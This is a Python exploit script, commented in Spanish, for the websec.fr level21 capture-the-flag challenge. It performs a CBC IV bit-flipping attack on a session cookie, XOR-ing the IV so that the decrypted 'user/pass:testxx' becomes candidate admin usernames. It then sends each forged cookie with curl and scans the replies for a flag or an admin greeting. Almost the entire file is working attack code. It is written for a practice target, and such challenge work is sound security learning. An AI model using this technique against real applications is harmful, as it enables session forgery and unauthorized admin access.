#!/usr/bin/env python3
import binascii
import subprocess
import re

# Cookie de testxx truncada
cookie = "3d2d8bf19f0ce326f736a1443b952355b1fad1874477f658622708ae3c2b008c833e083ffd1bce3a3d4a8e0094382e53"

iv_hex = cookie[:32]
ct_hex = cookie[32:]

actual = b"user/pass:testxx"

# Lista de usernames de 6 caracteres que podrían ser el admin real
# Probando combinaciones que tengan sentido
candidates = [
    "admin\x00",  # admin + null
    "admin\x01",  # admin + 0x01  
    "admin\x20",  # admin + space (ya probado)
    "Admin\x00",  # Admin + null
    "ADMIN\x00",  # ADMIN + null
    "root\x00\x00",  # root + 2 nulls
    "system",     # system
    "adm\x00\x00\x00",  # adm + nulls
]

print("Probando usernames de 6 bytes que podrían estar en la DB...\n")

for username in candidates:
    target = b"user/pass:" + username.encode() if isinstance(username, str) else b"user/pass:" + username
    
    if len(target) != 16:
        print(f"Skip {username} - wrong length")
        continue
    
    iv_test = bytearray(binascii.unhexlify(iv_hex))
    
    for i in range(16):
        iv_test[i] = iv_test[i] ^ actual[i] ^ target[i]
    
    cookie_test = binascii.hexlify(iv_test).decode() + ct_hex
    
    cmd = f'timeout 8s curl -s https://websec.fr/level21/index.php --cookie "session={cookie_test}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    flag_match = re.search(r'WEBSEC\{[^}]+\}', result.stdout)
    if flag_match:
        print(f"\n★★★ FLAG con username {repr(username)}: {flag_match.group(0)} ★★★")
        exit(0)
    
    if "Hello admin" in result.stdout:
        print(f"\n★★★ ADMIN con {repr(username)}! ★★★")
        # Buscar flag
        for line in result.stdout.split('\n'):
            if 'flag' in line.lower() or 'WEBSEC' in line:
                print(line.strip())
        exit(0)
    
    status = "Wrong" if "Wrong" in result.stdout else ("Empty" if len(result.stdout) < 1400 else "Other")
    print(f"  {repr(username):20s}: {status}")

print("\nNinguno de los candidatos funcionó")
